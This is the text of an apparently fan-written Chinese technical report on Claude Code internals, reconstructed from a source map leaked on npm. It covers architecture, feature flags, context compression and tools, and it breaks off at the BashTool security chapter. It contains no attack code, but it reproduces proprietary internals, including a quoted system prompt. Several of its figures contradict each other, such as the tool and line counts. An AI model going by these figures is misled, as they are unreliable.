@@ -1,0 +1,3698 @@
+
+--- Page 1 ---
+Claude Code
+0331
+系统报告
+基于 2026.03.31 npm Source Map 泄露版本的深度技术分析
+1,884 files  ·  394,222 lines  ·  54 tools  ·  89 feature flags
+30 chapters  ·  6 appendices  ·  12 parts
+公众号：手工川
+2026.04.01
+
+--- Page 3 ---
+Claude Code 0331 系统报告
+目  录
+—  3  —
+目 录
+第一部分：背景与概览
+第1章 · 事件始末
+第2章 · 全景统计
+第二部分：核心架构深度解析
+第3章 · 启动系统与多模式架构
+第4章 · 查询引擎（QueryEngine）
+第5章 · Token经济学与上下文管理
+第6章 · 上下文系统
+第三部分：工具系统全解
+第7章 · 工具架构
+第8章 · 54个工具逐一拆解
+第9章 · BashTool安全深度分析
+第10章 · 权限模型
+第四部分：KAIROS与自主Agent系统
+第11章 · KAIROS：自主助手模式全解
+第12章 · DreamTask与自动记忆巩固
+第13章 · 多Agent系统：三条技术路线
+第五部分：记忆与知识系统
+第14章 · 四层记忆架构
+第六部分：通信与远程控制
+第15章 · Bridge系统
+第16章 · 远程与直连
+第七部分：UI与前端工程
+第17章 · 自定义Ink框架
+第18章 · 组件库与状态管理
+第八部分：插件生态与扩展系统
+第19章 · 插件系统
+
+--- Page 4 ---
+Claude Code 0331 系统报告
+目  录
+—  4  —
+第20章 · 技能系统
+第21章 · MCP集成
+第九部分：安全与企业特性
+第22章 · 七层安全防护体系
+第23章 · 企业功能
+第十部分：隐藏特性与彩蛋
+第24章 · 隐藏命令完整清单
+第25章 · Buddy虚拟宠物系统
+第26章 · Computer Use与浏览器集成
+第十一部分：工程实践与设计哲学
+第27章 · 关键设计模式
+第28章 · 性能工程
+第十二部分：战略推演
+第29章 · Anthropic的产品路线图推演
+第30章 · 竞争格局影响
+附录
+附录A · 54个工具完整清单
+附录B · 89个特性标志完整清单
+附录C · 117个命令目录完整清单
+附录D · 关键源文件索引（Top 30）
+附录E · 数据流架构图
+附录F · 术语表
+
+--- Page 5 ---
+Claude Code 0331 系统报告
+—  5  —
+公众号：手工川
+2026-04-01
+第一部分：背景与概览
+
+--- Page 6 ---
+Claude Code 0331 系统报告
+第一部分：背景与概览
+—  6  —
+公众号：手工川
+2026-04-01
+第1章 · 事件始末
+1.1 泄露经过
+2026年3月31日，区块链基础设施公司Solayer的实习生Chaofan
+Shou在对Anthropic发布于npm注册表的Claude 
+Code安装包进行常规检查时，发现包中包含了一个名为
+cli.js.map 的文件，大小为59.8MB。
+Source Map（源代码映射）是一种开发调试工具，它建立了编译/打包后的代码与原始源代码之间的映
+射关系。在正常的生产发布流程中，Source
+Map文件应当被排除在发布包之外。然而，Anthropic的CI/CD流水线在构建Claude 
+Code
+v2.1.88版本时，未能正确配置 
+.npmignore 
+或 
+files 
+字段，导致 
+cli.js.map
+被一同发布到了公共npm注册表。
+这不是一次黑客攻击或数据泄露——这是一个发布流程配置失误。
+1.2 技术原理：Source Map如何还原完整源码
+Source Map是一个JSON文件，遵循Source Map v3规范。其核心字段包括：
+• sources：原始源文件路径数组
+• sourcesContent：每个源文件的完整原始内容
+• mappings：Base64 VLQ编码的位置映射
+当 sourcesContent 字段存在时，无需访问原始仓库即可完整还原所有源文件。Bun打包器生成的Source
+Map默认包含 sourcesContent，这意味着Claude Code的全部TypeScript源码——包括开发者手写的注释—
+—都以明文形式嵌入在了这个59.8MB的JSON文件中。
+社区成员使用标准工具（如 source-map npm包或 vlq 解码器）即可在数分钟内完成还原。
+1.3 社区反应
+消息扩散速度极快。在Chaofan Shou发布发现后的30分钟内，GitHub上的克隆仓库已积累超过5,000个St
+ar。截至报告撰写时，多个分析仓库的Star总数已超过50,000。
+主要媒体反应包括：
+• 量子位/新智元："刚刚，Claude Code开源了！51万行代码，全网狂欢"
+• 36氪（亲爱的数据）："炸裂：疑似Claude Code原生源码被扒光泄露？连开发手写注释都有"
+• 36氪（字母AI）："Claude Code源码泄露，下一个王牌提前曝光"
+• 智东西："突发！Claude Code'开源'，全网疯传"
+
+--- Page 7 ---
+Claude Code 0331 系统报告
+第1章 · 事件始末
+—  7  —
+公众号：手工川
+2026-04-01
+• DEV Community："Claude Code's Entire Source Code Was Just Leaked via npm Source Maps"
+1.4 法律定性
+需要明确：这不是Anthropic主动开源。Anthropic对Claude
+Code源代码拥有完整版权。泄露代码的npm包许可证并未授予用户查看、修改或再分发源码的权利。
+本报告的分析仅用于学术研究和技术讨论目的，不涉及任何代码的再分发或商业利用。
+1.5 本报告研究方法论
+本报告的分析基于以下方法：
+1. 完整代码还原：从npm包中的 cli.js.map 文件还原全部1,884个TypeScript源文件
+2. 自动化扫描：使用自动化工具统计代码规模、模块依赖、特性标志分布
+3. 并行深度审读：6个分析Agent并行对不同子系统进行逐文件审读
+4. 交叉验证：对关键发现进行源码回溯验证，确保技术断言的准确性
+5. 竞品对比：与已有媒体报道进行信息差分析，确保报告提供增量价值
+
+--- Page 8 ---
+Claude Code 0331 系统报告
+第1章 · 事件始末
+—  8  —
+公众号：手工川
+2026-04-01
+第2章 · 全景统计
+2.1 代码规模
+指标
+数值
+源文件总数
+1,884 个 (.ts/.tsx)
+总代码行数
+118,442 行（Source Map中标记的文件），完整计数394,222行
+文件总数（含非代码）
+1,902 个
+Source Map原始大小
+59.8 MB
+目录数量（两级）
+120+
+2.2 技术栈
+组件
+技术选择
+语言
+TypeScript（严格模式）
+运行时
+Bun（非Node.js）
+打包器
+Bun Bundler（支持编译时特性标志）
+UI框架
+自定义Ink（React for Terminal，深度重写）
+布局引擎
+自研Yoga Layout（从C++移植的纯TS实现）
+状态管理
+自研Store（类Zustand，DeepImmutable包装）
+API协议
+Anthropic Messages API + MCP
+认证
+OAuth 2.0 PKCE + JWT
+遥测
+GrowthBook + Datadog
+原生模块
+Rust（enigo鼠标键盘）+ Swift（截屏/TCC权限）
+2.3 Top 20 最大源文件
+排名
+文件
+行数
+功能
+1
+main.tsx
+4,683
+主协调器——启动、配置、模
+式选择、会话管理
+2
+query.ts
+1,729
+查询循环——API请求、压缩
+、重试
+3
+QueryEngine.ts
+1,295
+查询引擎——状态管理、Toke
+n预算、系统提示
+
+--- Page 9 ---
+Claude Code 0331 系统报告
+第2章 · 全景统计
+—  9  —
+公众号：手工川
+2026-04-01
+排名
+文件
+行数
+功能
+4
+Tool.ts
+792
+工具接口——泛型定义、权限
+、进度事件
+5
+commands.ts
+754
+命令注册表——100+命令的加
+载与过滤
+6
+setup.ts
+477
+初始化——认证、设置、遥测
+配置
+7
+history.ts
+464
+历史管理——JSONL、粘贴存
+储、并发安全
+8
+tools.ts
+389
+工具装配——条件编译、延迟
+加载、池构建
+9
+interactiveHelpers.tsx
+365
+交互辅助——KAIROS通道、权
+限提示
+10
+cost-tracker.ts
+323
+成本追踪——Token统计、US
+D计算、模型聚合
+11
+context.ts
+189
+上下文系统——Git状态、CLA
+UDE.md加载
+12
+Task.ts
+125
+任务基类——7种任务类型、
+状态机
+13
+dialogLaunchers.tsx
+132
+对话框启动器——信任、权限
+、设置
+14
+projectOnboardingState.ts
+83
+项目引导状态管理
+15
+ink.ts
+85
+Ink框架入口——渲染器初始
+化
+注：cli/print.ts 和 bridge/bridgeMain.ts 等文件在子目录中，实际行数更大（print.ts约5000+行，bri
+dgeMain.ts约3000+行），但不在顶层文件统计中。
+2.4 模块依赖关系
+     │ ▼ ┌─────────────┐ ┌──────────────┐ ┌─────────────┐ │ entrypoints/│────▶│ main.tsx │────▶│
+screens/ │ │ cli.tsx │ │ (   ) │ │ REPL.tsx │ └─────────────┘ └──────┬───────┘ └──────┬──────┘ │
+│ ┌────────────┼────────────┐ │ ▼ ▼ ▼ ▼ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ │
+query.ts │ │ tools.ts │ │commands.ts│ │ state/ │ │QueryEngine│ │ Tool.ts │ │commands/ │ │
+AppState │ └────┬─────┘ └────┬─────┘ └──────────┘ └──────────┘ │ │ ▼ ▼ ┌──────────┐
+┌──────────────────────────────────┐ │services/ │ │ tools/ │ │ api/ │ │ BashTool AgentTool
+FileEditTool │ │ mcp/ │ │ GrepTool WebSearch MCPTool ... │ │ lsp/ │ │ (54   ) │ │ compact/│
+└──────────────────────────────────┘ │ oauth/ │ │ analytics│ ┌──────────┐ ┌──────────┐ │ ... │ │
+bridge/ │ │coordinator│ └──────────┘ │      │ │  Agent │ └──────────┘ └──────────┘
+2.5 与竞品的架构对比
+维度
+Claude Code
+Cursor
+Windsurf
+Cline
+Aider
+形态
+CLI（终端）
+IDE（VS
+Code分支）
+IDE（VS
+Code分支）
+VS Code插件
+CLI（Python）
+语言
+TypeScript/Bun
+TypeScript/Electron
+TypeScript/Electron
+TypeScript
+Python
+工具数
+44
+~15
+~12
+~10
+~8
+多Agent
+3条路线
+单Agent
+单Agent
+单Agent
+无
+
+--- Page 10 ---
+Claude Code 0331 系统报告
+第2章 · 全景统计
+—  10  —
+公众号：手工川
+2026-04-01
+维度
+Claude Code
+Cursor
+Windsurf
+Cline
+Aider
+记忆系统
+4层
+简单缓存
+简单缓存
+无
+无
+远程控制
+Bridge（3代）
+无
+无
+无
+无
+自主模式
+KAIROS
+无
+无
+无
+无
+插件生态
+MCP（7传输）
+扩展市场
+无
+MCP
+无
+代码规模
+~12万行
+未公开
+未公开
+~2万行
+~3万行
+
+--- Page 11 ---
+Claude Code 0331 系统报告
+第2章 · 全景统计
+—  11  —
+公众号：手工川
+2026-04-01
+第二部分：核心架构深度解析
+
+--- Page 12 ---
+Claude Code 0331 系统报告
+第二部分：核心架构深度解析
+—  12  —
+公众号：手工川
+2026-04-01
+第3章 · 启动系统与多模式架构
+3.1 入口点 cli.tsx
+Claude 
+Code的启动从 
+entrypoints/cli.tsx 
+开始。这个文件实现了一套多层快速路径（Fast
+Path）系统，其设计哲学是：尽可能早地判断用户意图，尽可能少地加载代码。
+启动流程可以分为三个阶段：
+阶段一：零导入检查（<5ms）
+//             if (args.includes('--version') || args.includes('-v')) { //                   console.log(VERSION); process.exit(0); }
+这个优化把最常见的CI场景（claude 
+--version
+检查）压缩到了毫秒级。不加载任何模块，不初始化任何服务。
+阶段二：模式分流（10+ 快速路径）
+在加载完整初始化逻辑之前，cli.tsx 会检查一系列特殊模式：
+• --daemon-worker：Daemon工作进程模式
+• remote-control / rc / bridge：Bridge远程控制模式
+• --dump-system-prompt：导出系统提示（调试用）
+• mcp：MCP服务器模式
+• sdk：SDK入口模式
+每种模式有独立的快速启动路径，避免加载不必要的模块。
+阶段三：完整初始化
+对于需要完整功能的模式（交互式、无头等），进入三步初始化：
+init() → setup() → main()
+init() 负责：配置加载、环境变量设置、网络初始化、后台任务启动（MDM轮询、钥匙链访问、API预
+连接并行执行）。
+setup() 负责：会话初始化、工作树创建、钩子配置、权限检查、Trust对话框。
+main() 负责：模式检测、命令/Agent加载、工具库构建、REPL启动。
+3.2 编译时特性标志系统
+这是理解Claude Code架构的关键。源码使用Bun的 bun:bundle 模块实现编译时条件分支：
+import { feature } from 'bun:bundle'; if (feature('KAIROS')) { const assistantModule =
+require('./assistant/index.js'); //                  }
+
+--- Page 13 ---
+Claude Code 0331 系统报告
+第3章 · 启动系统与多模式架构
+—  13  —
+公众号：手工川
+2026-04-01
+Bun打包器在编译时将 feature() 调用替换为常量布尔值，然后通过Dead Code Elimination将不可达的分
+支彻底移除。这不是运行时的条件跳过——是编译产物中物理上不存在这些代码。
+16个主要特性标志完整清单：
+#
+特性标志
+功能描述
+出现文件数
+出现次数
+1
+KAIROS
+7×24自主助手模式
+57
+158
+2
+KAIROS_BRIEF
+精简交互视图
+12
+~20
+3
+KAIROS_CHANNELS
+MCP通道通知
+5
+~8
+4
+KAIROS_PUSH_NOTIFIC
+ATION
+推送通知
+3
+~5
+5
+KAIROS_GITHUB_WEBH
+OOKS
+GitHub事件订阅
+2
+~3
+6
+KAIROS_DREAM
+自主做梦/记忆
+2
+~3
+7
+COORDINATOR_MODE
+多Agent协调器
+15
+32
+8
+BRIDGE_MODE
+远程控制系统
+8
+~15
+9
+VOICE_MODE
+语音交互
+5
+~10
+10
+PROACTIVE
+主动式Agent
+10
+~20
+11
+ULTRAPLAN
+远程浏览器规划
+3
+~5
+12
+TRANSCRIPT_CLASSIFIER
+AI权限分类器
+5
+~8
+13
+WORKFLOW_SCRIPTS
+工作流脚本
+3
+~5
+14
+TEAMMEM
+团队记忆共享
+4
+~6
+15
+CCR_MIRROR
+CCR镜像同步
+2
+~3
+16
+BUDDY
+虚拟宠物系统
+2
+~3
+此外还有73个次要/内部特性标志（如AGENT_TRIGGERS, MONITOR_TOOL, FORK_SUBAGENT, UDS_INBOX,
+TORCH, ULTRATHINK, ULTRAPLAN等），代码库中共计89个特性标志。完整清单详见附录B。
+3.3 10种运行模式
+Claude Code的单一代码库支持以下运行模式：
+1. 
+交互模式（Interactive） 
+——
+默认模式。用户在终端中与Claude对话，支持完整的TUI界面、工具调用、权限审批。
+2. 
+无头模式（Headless 
+/ 
+Print） 
+—— 
+通过 
+-p
+参数触发。无TUI界面，直接输出结果到stdout。用于脚本集成和CI/CD流水线。
+3. 
+Bridge远程控制 
+—— 
+通过 
+claude 
+bridge
+子命令启动。接受来自手机/Web的远程连接，允许远程操控CLI。
+4. KAIROS助手模式 —— 通过 claude assistant 子命令启动。7×24小时自主运行的AI助手，通过GitHub
+Webhook和MCP Channel感知环境变化，主动执行任务。
+5. 
+Coordinator协调器 
+—— 
+通过 
+--agent-teams 
+参数启动。一个Leader 
+Claude协调多个Worker
+Claude并行工作。
+6. Daemon守护进程 —— 通过 --daemon-worker 启动。后台常驻进程，接收调度任务。
+
+--- Page 14 ---
+Claude Code 0331 系统报告
+第3章 · 启动系统与多模式架构
+—  14  —
+公众号：手工川
+2026-04-01
+7. 语音模式（Voice） —— 通过 /voice 命令激活。使用 voice_stream 端点实现实时语音对话。
+8. SDK模式 —— 通过 entrypoints/sdk/ 入口。为第三方开发者提供编程式API。
+9. 
+MCP服务器模式 
+—— 
+通过 
+claude 
+mcp 
+启动。Claude
+Code自身作为MCP服务器运行，供其他MCP客户端调用。
+10. SSH远程模式 —— 通过 claude ssh <host> 启动。在远程主机上启动Claude Code会话。
+3.4 main.tsx 逐段解读
+main.tsx 是整个应用的心脏，4,683行代码。其核心流程可以分为以下阶段：
+行1-100：模块导入与条件加载
+const coordinatorModeModule = feature('COORDINATOR_MODE') ?
+require('./coordinator/coordinatorMode.js') : null; const assistantModule = feature('KAIROS') ?
+require('./assistant/index.js') : null;
+使用 
+require() 
+而非 
+import 
+是有意为之——这是Lazy
+Require模式，用于打破循环依赖并延迟模块加载。
+行100-500：CLI参数解析
+使用Commander.js构建命令行参数。特性标志门控的选项通过条件添加：
+if (feature('PROACTIVE') || feature('KAIROS')) { program.addOption(new Option('--proactive',
+'...')); }
+行500-1000：初始化阶段
+并行执行：MDM策略获取、钥匙链访问、API预连接、GrowthBook初始化。Terminal.app和iTerm2的备
+份自动恢复也在此阶段执行。
+行1000-2000：模式激活
+KAIROS激活路径、Coordinator模式检测、Proactive模式设置、Brief模式配置。这是特性标志密度最高的
+区域。
+行2000-3000：工具库构建
+调用 tools.ts 的 getAllBaseTools() 构建工具池，应用权限过滤，配置延迟加载。
+行3000-4000：REPL启动
+根据模式选择进入交互式REPL、无头模式、Bridge模式或KAIROS模式。
+行4000-4683：辅助函数
+Proactive激活、Brief激活、CLI解析辅助等。
+
+--- Page 15 ---
+Claude Code 0331 系统报告
+第3章 · 启动系统与多模式架构
+—  15  —
+公众号：手工川
+2026-04-01
+第4章 · 查询引擎（QueryEngine）
+4.1 query.ts：查询循环
+query.ts（1,729行）实现了Claude Code的核心查询循环。它使用异步生成器（AsyncGenerator）模式，
+将每次与API的交互表示为一个可迭代的事件流：
+async function* queryLoop(params: QueryParams): AsyncGenerator<QueryEvent> { while (true) { //
+1.   API   const request = buildRequest(messages, tools, systemPrompt); // 2.             for
+await (const event of streamResponse(request)) { yield event; //           } // 3.        if
+(hasToolCalls(lastResponse)) { const results = await executeTools(toolCalls);
+messages.push(...results); continue; //      } // 4.       =      break; } }
+这个设计的优雅之处在于：查询循环是一个无限生成器，每次 
+yield
+一个事件，调用方可以按需消费。工具执行在循环内部完成，消息历史在迭代间保持。
+4.2 QueryEngine.ts：状态管理与Token预算
+QueryEngine.ts（1,295行）是查询系统的上层协调器，负责：
+Token预算管理：维护一个动态的Token预算，计算方式为：
+     =         -     Token -   Schema Token -      (13,000)
+当消息历史的Token用量接近有效预算时，触发压缩。
+系统提示构建：系统提示由多个动态Section组成，每个Section有独立的生成函数和缓存策略。Section包
+括：基础指令、工具描述、用户上下文（CLAUDE.md）、项目信息（Git状态）、Proactive指令、Brief指
+令等。
+消息规范化：每次发送前，消息序列经过完整的规范化处理：
+1. 完整性检查（确保assistant/user交替）
+2. 缓存断点插入（在稳定内容处标记）
+3. 工具引用清理（移除已压缩消息的引用）
+4. Token计数更新
+4.3 流式处理与工具并发
+Claude 
+Code的流式处理不是简单的"接收文本并显示"。它实现了一个
+StreamingToolExecutor，允许在API仍在流式返回时就开始执行已完成的工具调用：
+API    : [   1][    A  ][   2][    A  ][    B  ]... ↑   A                    这个设计显著减少了总往返时间——工具执行和API流式传输并行进行。
+
+--- Page 16 ---
+Claude Code 0331 系统报告
+第4章 · 查询引擎（QueryEngine）
+—  16  —
+公众号：手工川
+2026-04-01
+4.4 错误恢复：三层策略
+预测性恢复：在Token超限之前，主动触发自动压缩。压缩阈值为 有效窗口 - 13,000。
+响应式恢复：如果API返回 
+prompt-too-long
+错误，立刻执行紧急压缩。紧急压缩比常规压缩更激进，同时缩减 maxOutputTokens。
+重试逻辑：网络错误和速率限制最多重试10次，容量错误最多3次。速率限制使用API返回的
+retry-after 头进行精确等待。
+断路器设计：如果连续3次压缩每次回收不到500个Token，压缩器自动禁用，避免无限循环。
+
+--- Page 17 ---
+Claude Code 0331 系统报告
+第4章 · 查询引擎（QueryEngine）
+—  17  —
+公众号：手工川
+2026-04-01
+第5章 · Token经济学与上下文管理
+5.1 三层压缩系统
+第一层：Snip压缩（预防性）
+Snip压缩的目标是在不影响对话质量的前提下，渐进式地回收Token。它的工作方式是：
+• 扫描消息历史，找到"时间上远离当前对话焦点"的工具输出
+• 将这些工具输出替换为一行摘要（如 "File content was read successfully"）
+• 严格保护近期N轮对话的完整内容不被压缩
+Snip压缩是静默执行的，用户不会感知到任何变化。
+第二层：自动压缩（阈值触发）
+当Token用量达到 有效上下文窗口 - 13,000 时，触发完整的对话压缩：
+1. 发起一次独立的LLM调用（使用更快的模型）
+2. 将整段对话历史作为输入
+3. 输出一份结构化的摘要
+4. 用摘要替换原始对话历史
+13,000 Token的缓冲区是经验值——它为"压缩请求本身"和"压缩后的首次回复"预留了足够空间。
+第三层：响应式压缩（紧急兜底）
+如果自动压缩后API仍然返回 prompt-too-long，执行紧急压缩：
+• 使用更激进的压缩策略
+• 同时缩减 maxOutputTokens 预算（最多3次）
+• 如果仍然失败，返回错误给用户
+5.2 微压缩
+这是一个精妙的优化。当用户通过 FileEditTool 修改了一个文件，系统会在消息历史中精确定位之前
+FileReadTool 读取该文件的工具结果，并将其删除。
+实现方式是在工具结果上维护文件路径索引。当检测到文件被修改时，通过索引快速定位过时的读取结
+果。
+这比全局压缩更精确——只删除已知过时的数据，保留所有仍然有效的上下文。
+5.3 缓存断点策略
+
+--- Page 18 ---
+Claude Code 0331 系统报告
+第5章 · Token经济学与上下文管理
+—  18  —
+公众号：手工川
+2026-04-01
+Claude 
+API支持Prompt 
+Caching——对重复出现的前缀内容，只需支付十分之一的Token费用。Claude
+Code利用这一机制，在消息序列中的稳定位置插入缓存断点：
+[    ] ←     1       [  Schema] ←     2        [      ] ←     3        [    ] ←          成本计算公式：
+     = input_tokens × price_per_token + output_tokens × price_per_token + cache_creation_tokens
+× price_per_token × 1.25 + cache_read_tokens × price_per_token × 0.1
+缓存读取只需正常价格的10%。在典型的多轮对话中，系统提示和早期历史会被反复缓存命中，实际输
+入成本可降低70-90%。
+5.4 cost-tracker.ts：实时计费
+cost-tracker.ts（323行）实现了精确的实时成本追踪：
+• 每次API调用后累积Token和成本
+• 按模型聚合统计（将具体版本号归一化为短名，如 claude-opus-4.1-20250514 → Opus）
+• 处理Advisor工具的嵌套成本递归
+• 接入OpenTelemetry计数器
+• 会话结束时持久化到项目配置文件
+
+--- Page 19 ---
+Claude Code 0331 系统报告
+第5章 · Token经济学与上下文管理
+—  19  —
+公众号：手工川
+2026-04-01
+第6章 · 上下文系统
+6.1 context.ts
+context.ts（189行入口）提供两类上下文：
+系统上下文（getSystemContext）：
+• 当前Git分支名和HEAD SHA（通过 gitFilesystem.ts 的纯文件系统读取，不调用git子进程）
+• 最近的Git日志（最后5条提交）
+• 未提交的变更（git diff摘要）
+• 操作系统和平台信息
+用户上下文（getUserContext）：
+• CLAUDE.md文件内容（层级合并：项目级 > 用户级 > 全局级）
+• Memory文件内容（从 ~/.claude/projects/<path>/memory/ 加载）
+• Dream产出的记忆（如果存在）
+6.2 Git文件系统读取
+一个值得注意的工程决策：Claude 
+Code读取Git状态时，不调用 
+git
+命令行工具。utils/git/gitFilesystem.ts（700行）直接读取 .git/ 目录的文件系统：
+• readGitHead()：解析 .git/HEAD 文件
+• resolveRef()：递归解析ref到SHA（先松散文件，再packed-refs）
+• getCommonDir()：处理Git Worktree（工作树指向主仓库的commonDir）
+为什么这样做？因为启动 git 子进程有不可忽视的开销（~10-50ms），而文件系统读取只需<1ms。在
+启动路径上，这个优化很有价值。
+此外，GitFileWatcher 类使用 fs.watchFile() 监视 .git/HEAD 和分支ref文件的变化，通过脏标记（dirty
+flag）机制实现低开销的缓存失效。
+6.3 系统提示构建
+constants/prompts.ts
+实现了动态的系统提示构建。系统提示由多个Section组成，每个Section是一个惰性求值的函数：
+const sections = [ systemPromptSection('base', () => getBasePrompt()),
+systemPromptSection('tools', () => getToolDescriptions(tools)), systemPromptSection('context',
+() => getUserContext()), systemPromptSection('proactive', () => getProactiveSection()),
+systemPromptSection('brief', () => getBriefSection()), // ... ]
+
+--- Page 20 ---
+Claude Code 0331 系统报告
+第6章 · 上下文系统
+—  20  —
+公众号：手工川
+2026-04-01
+Section的求值是延迟的——只在实际需要时才计算。不同模式（交互 
+vs 
+KAIROS 
+vs
+Coordinator）使用不同的Section组合。
+KAIROS模式的系统提示包含一段关键指令：
+"You are an autonomous agent. Use the available tools to do useful work. You will receive <tick>
+prompts that keep you alive between turns — just treat them as 'you're awake, what now?' The
+time in each <tick> is the user's current local time."
+
+--- Page 21 ---
+Claude Code 0331 系统报告
+第6章 · 上下文系统
+—  21  —
+公众号：手工川
+2026-04-01
+第三部分：工具系统全解
+
+--- Page 22 ---
+Claude Code 0331 系统报告
+第三部分：工具系统全解
+—  22  —
+公众号：手工川
+2026-04-01
+第7章 · 工具架构
+7.1 Tool.ts：统一接口
+Tool.ts（792行）定义了所有工具的统一接口：
+interface Tool<Input, Output, Progress> { name: string; description: string; inputSchema:
+JSONSchema; //      execute(input: Input, context: ToolContext): AsyncGenerator<Progress,
+Output>; //      isAllowed(input: Input, context: PermissionContext): PermissionDecision; //
+         prompt(): string; //         shouldDefer?: boolean; //          needsPermission(input:
+Input): boolean; }
+关键设计决策：
+1. 泛型三参数：Input（输入Schema类型）、Output（最终返回值）、Progress（流式进度事件）
+2. AsyncGenerator执行：工具执行是异步生成器，支持流式进度报告
+3. 故障关闭默认值：buildTool() 工厂函数为所有可选字段提供安全默认值
+7.2 工具装配管道
+从源码加载到模型可用，工具经过以下管道：
+getAllBaseTools() //                 ↓ filterToolsByDenyRules() //            +    ↓ getTools()
+//     /     ↓ assembleToolPool() //        MCP    ↓ getMergedTools() //              7.3 延迟加载机制
+ToolSearchTool 是延迟加载的枢纽。模型初始只看到核心工具集（约15个），其余工具的描述被缓存在
+ToolSearchTool 
+内部。当模型需要特定能力时，调用 
+ToolSearchTool
+进行关键词搜索，返回匹配工具的完整Schema。
+搜索支持两种模式：
+• 关键词搜索："notebook jupyter" → 匹配 NotebookEditTool
+• 精确选择："select:MCPTool,LSPTool" → 直接加载指定工具
+
+--- Page 23 ---
+Claude Code 0331 系统报告
+第7章 · 工具架构
+—  23  —
+公众号：手工川
+2026-04-01
+第8章 · 54个工具逐一拆解
+8.1 文件操作组
+FileReadTool 
+—— 
+读取文件内容。支持行号范围（offset/limit）、PDF页面范围、Jupyter
+Notebook渲染、图片二进制读取。实现了文件大小预检查，超大文件自动截断并提示使用行号范围。
+FileWriteTool —— 写入/创建文件。执行前检查：目标目录是否存在、文件是否已被其他工具锁定。写
+入后触发微压缩（删除同一文件的过时读取缓存）。
+FileEditTool 
+—— 
+精确字符串替换。核心逻辑：查找 
+old_string 
+的唯一匹配位置，替换为
+new_string。如果 
+old_string 
+不唯一，返回错误要求提供更多上下文。支持 
+replace_all
+模式。并发编辑检测：如果文件在上次读取后被外部修改，发出警告。
+GlobTool —— 文件模式匹配。使用 fast-glob 库，支持 **/*.ts 等模式。结果按修改时间排序。
+GrepTool —— 内容搜索。基于 ripgrep（rg），支持正则、文件类型过滤、上下文行、多行匹配。输出
+模式：content（显示匹配行）、files_with_matches（仅文件路径）、count（计数）。
+8.2 执行组
+BashTool —— Shell命令执行。经过25项安全检查（详见第9章）。支持超时配置（最大600秒）、后台
+执行、工作目录设置。输出截断：超长输出自动写入临时文件并返回路径。
+PowerShellTool —— Windows PowerShell执行。类似BashTool但针对Windows环境优化。
+REPLTool —— 虚拟机执行（ANT专用）。在受控的VM沙箱中执行代码片段，不同于直接的Bash执行。
+提供更强的隔离和更快的启动。
+8.3 Agent组
+AgentTool —— 核心的子Agent生成工具。支持三种隔离模式：
+1. Worktree隔离：创建Git
+Worktree，子Agent在独立分支工作。完成后自动清理（无变更时）或返回变更分支。
+2. 远程隔离（ANT专用）：在CCR环境中启动完全隔离的远程Agent。
+3. CWD覆盖：最轻量的隔离——仅限制子Agent的工作目录。
+子Agent可以配置独立的MCP服务器（内联或引用）、自定义系统提示、特定的工具子集。
+SendMessageTool 
+——
+Agent间消息传递。在多Agent场景中，Agent之间通过此工具通信。支持按Agent名称或ID寻址。
+
+--- Page 24 ---
+Claude Code 0331 系统报告
+第8章 · 54个工具逐一拆解
+—  24  —
+公众号：手工川
+2026-04-01
+8.4 Web组
+WebSearchTool 
+——
+Web搜索。调用Anthropic的搜索API，返回结构化的搜索结果。支持域名过滤（允许/阻止列表）。
+WebFetchTool —— URL内容获取。获取网页内容并通过小模型进行摘要。支持HTML→Markdown转换、
+重定向跟随、15分钟缓存。
+8.5 MCP组
+MCPTool 
+—— 
+MCP工具调用的模板。运行时被 
+mcpClient.ts
+动态覆盖，每个连接的MCP服务器生成独立的工具实例。工具名格式：mcp__serverName__toolName。
+ListMcpResourcesTool —— 列出MCP服务器提供的资源。
+ReadMcpResourceTool —— 读取特定MCP资源。
+McpAuthTool —— MCP服务器的OAuth认证流程。
+8.6 任务管理组
+TaskCreateTool —— 创建后台任务。支持的任务类型：local_bash、local_agent、remote_agent。每种类
+型有不同的创建参数和执行环境。
+TaskGetTool —— 获取任务状态和详情。
+TaskListTool —— 列出所有活跃任务。
+TaskOutputTool —— 获取任务的完整输出。
+TaskStopTool —— 停止运行中的任务。
+TaskUpdateTool —— 更新任务参数（如发送消息给运行中的Agent任务）。
+8.7 团队组
+TeamCreateTool —— 创建多Agent团队。在tmux中生成新的Agent实例，配置团队名称和角色。
+TeamDeleteTool —— 删除团队及其所有Agent实例。
+8.8 模式切换组
+EnterPlanModeTool —— 进入计划模式。在此模式下，模型只能读取和搜索，不能修改文件或执行命令
+。用于安全的代码分析和规划。
+ExitPlanModeTool —— 退出计划模式，恢复完整工具权限。
+EnterWorktreeTool —— 进入Git Worktree隔离。创建独立分支，所有后续操作在隔离环境中执行。
+ExitWorktreeTool —— 退出Worktree，合并或放弃变更。
+8.9 KAIROS专属组
+
+--- Page 25 ---
+Claude Code 0331 系统报告
+第8章 · 54个工具逐一拆解
+—  25  —
+公众号：手工川
+2026-04-01
+SleepTool 
+——
+AI主动睡眠。当KAIROS模式下没有待处理的工作时，Claude调用此工具进入等待状态。下一个 
+<tick>
+或外部事件将唤醒它。支持用户中断。
+SendUserFileTool —— 主动向用户发送文件。KAIROS模式下Claude可以主动将生成的文件推送给用户。
+PushNotificationTool —— 推送通知到用户设备。KAIROS完成任务后可以通知用户。
+SubscribePRTool 
+—— 
+订阅GitHub
+PR事件。KAIROS通过此工具感知代码变更，决定是否需要介入（如代码审查、CI修复）。
+8.10 其他工具
+ScheduleCronTool —— 定时任务调度。支持cron表达式，让Claude Code按计划自动执行任务。
+SkillTool —— 技能调用。从内置或用户自定义的技能库中加载并执行特定技能。
+LSPTool —— Language Server Protocol操作。支持go-to-definition、find-references、hover等LSP操作，通
+过文件扩展名自动路由到对应的语言服务器。
+BriefTool 
+——
+KAIROS的精简交互工具。将Claude的输出浓缩为简短的用户可见消息，减少在自主模式下的输出噪音。
+TodoWriteTool 
+——
+任务列表管理。维护结构化的待办事项列表，支持状态追踪（pending/in_progress/completed）。
+SyntheticOutputTool —— 生成合成输出。用于在特定场景下生成格式化的输出内容。
+NotebookEditTool 
+—— 
+Jupyter
+Notebook编辑。理解Cell结构（code/markdown/output），支持精确的Cell级编辑操作。
+ConfigTool —— 配置管理（ANT专用）。支持读取和修改Claude Code的运行时配置。
+RemoteTriggerTool —— 远程触发器。在Bridge模式下触发远程操作。
+ToolSearchTool —— 工具搜索（延迟加载枢纽）。搜索并加载延迟工具的Schema。
+
+--- Page 26 ---
+Claude Code 0331 系统报告
+第8章 · 54个工具逐一拆解
+—  26  —
+公众号：手工川
+2026-04-01
+第9章 · BashTool安全深度分析
+9.1 25项安全检查
